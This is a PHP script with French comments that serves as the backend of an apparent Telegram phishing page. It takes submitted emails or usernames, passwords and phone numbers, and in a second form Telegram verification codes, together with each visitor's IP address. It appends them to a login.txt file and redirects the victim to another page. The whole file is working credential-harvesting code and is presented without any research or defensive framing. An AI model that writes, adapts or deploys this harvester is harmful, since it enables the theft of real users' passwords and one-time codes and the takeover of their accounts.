<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $form_type = $_POST["form_type"] ?? '';

    // Récupère l'adresse IP et la date actuelle
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // === CAS 1 : FORMULAIRE DE CODE DE VÉRIFICATION ===
    if ($form_type === "telegram_code") {
        $verification_code = htmlspecialchars(trim($_POST["code"] ?? ''));

        if (!empty($verification_code)) {
            $data = "=== CODE DE VÉRIFICATION TELEGRAM ===\n";
            $data .= "Date: $date\n";
            $data .= "Code de vérification: $verification_code\n";
            $data .= "Adresse IP: $ip\n";
            $data .= "=====================================\n\n";
        } else {
            echo "Erreur : Code manquant.";
            exit();
        }
    }
    // === CAS 2 : FORMULAIRE CLASSIQUE D'IDENTIFIANTS ===
    else {
        $username = htmlspecialchars(trim($_POST["email"] ?? ''));
        $password = htmlspecialchars(trim($_POST["password"] ?? '')); 
        $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));
        $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));
        $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';

        if (!empty($username) && !empty($password)) {
            $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
            $data .= "Date: $date\n";
            $data .= "Email/Username: $username\n";
            $data .= "Téléphone: $country_code$phone_number\n";
            $data .= "Mot de passe: $password\n";
            $data .= "Session active: $remember\n";
            $data .= "Adresse IP: $ip\n";
            $data .= "==================================\n\n";
        } else {
            echo "Erreur : Informations d'identification incomplètes.";
            exit();
        }
    }

    // Configuration du fichier d’enregistrement
    $file = "login.txt";

    if (!file_exists($file)) {
        touch($file);
        chmod($file, 0644);
    }

    if (!is_writable($file)) {
        chmod($file, 0644);
    }

    clearstatcache(); // Nettoie les infos système

    // Écriture avec verrou pour éviter les conflits
    $attempts = 0;
    $max_attempts = 3;
    $written = false;

    while ($attempts < $max_attempts && !$written) {
        $written = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        if ($written === false) {
            usleep(100000); // 100ms
            $attempts++;
        }
    }

    if ($written !== false) {
        header("Location: mer.html");
        exit();
    } else {
        error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans $file. IP: $ip");
        echo "Erreur système : Veuillez réessayer plus tard.";
        exit();
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    echo "Accès refusé : Méthode non autorisée.";
    exit();
}
?
